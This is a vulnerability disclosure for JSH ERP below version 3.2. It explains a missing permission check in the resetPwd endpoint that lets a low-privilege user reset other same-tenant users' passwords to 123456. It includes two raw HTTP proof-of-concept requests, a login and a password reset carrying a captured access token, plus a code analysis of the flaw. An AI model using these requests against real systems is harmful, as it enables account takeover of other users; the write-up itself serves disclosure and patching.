### Logic loopholes in Huaxia ERP can lead to unauthorized access

### Author: heishou

### project address

### https://gitee.com/jishenghua/JSH_ERP/

### Affected version

<3.2。

### Vulnerability analysis 

Log in as administrator.

![img](https://cdn-images-1.medium.com/max/900/0*dISR_sba4TbVS7sP)

Open a new private browser access.

![img](https://cdn-images-1.medium.com/max/900/0*8j4gJPb9RWrZVnty)

First set the database user password to md5 of adc

![img](https://cdn-images-1.medium.com/max/900/0*6QzQxGXVZLm4TsqS)

First create several users and log in using user a1. Users can build their own

![img](https://cdn-images-1.medium.com/max/900/0*NZ-DF0LeXNpx4OTP)

POC：

```
POST /jshERP-boot/user/login/ HTTP/1.1
Host: 10.28.195.138:9999
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 64
Content-Type: application/json

{"loginName":"a1","password":"900150983cd24fb0d6963f7d28e17f72"}
```

First create several users and log in using user a1. Users can create their own. It can be observed that the user ID of user a1 is 148. Is the tenant of user 146. The login token f4cab0beb17642688dfa02a5a47a1d05_146 is used to construct the data packet

```
POST /jshERP-boot/user/resetPwd HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
X-Access-Token:f4cab0beb17642688dfa02a5a47a1d05_146
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Purpose: prefetch
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 12

{"id":"146"}
```

![img](https://cdn-images-1.medium.com/max/900/0*Ntp8CoAtTp2dG2Es)

Sending data packets found that the reset was successful. Users with other tenant IDs cannot be modified.

![img](https://cdn-images-1.medium.com/max/900/0*U9eIByX3jhTA3A-7)

The screenshot of the modified database user table is as follows (you can observe that the user password under tenant id146 has been changed):

![img](https://cdn-images-1.medium.com/max/900/0*iHLrYbStNL_ilYMQ)

### code analysis

###  

Through code audit, it can be found that the permissions of user functions are not verified. In the resetPwd function on line 209 of src/main/java/com/jsh/erp/controller/UserController.java.

![img](https://cdn-images-1.medium.com/max/900/0*ELm8ghWp30QvRjG6)

User passwords can be reset. Looking at the service level code, we found that there are restrictions on password modification only for users named admin.。

![img](https://cdn-images-1.medium.com/max/900/0*NKDBDzc0MrV9G2PJ)

The actually executed database statement updates the jsh_user table by id.

![img](https://cdn-images-1.medium.com/max/900/0*tPujpWpQ_0WFKAdV)

The statements in xml are: SELECT id, username, login_name, password, position, department, email, phonenum, ismanager, isystem, Status, description, remark, tenant_id FROM jsh_user WHERE id = ? The actual executed statements listed here are: SELECT id, username, login_name, password, position, department, email, phonenum, ismanager, isystem, Status, description, remark, tenant_id FROM jsh_user WHERE jsh_user.tenant_id = 146 AND id = ? It can be found that there are restrictions on tenant_id. A logical review of the website revealed that tenant_id is the tenant’s id. It is set through the sql interceptor

![img](https://cdn-images-1.medium.com/max/900/0*BqcFbajFzdY1q61J)

Through this vulnerability, the password of any user except the administrator can be changed to 123456.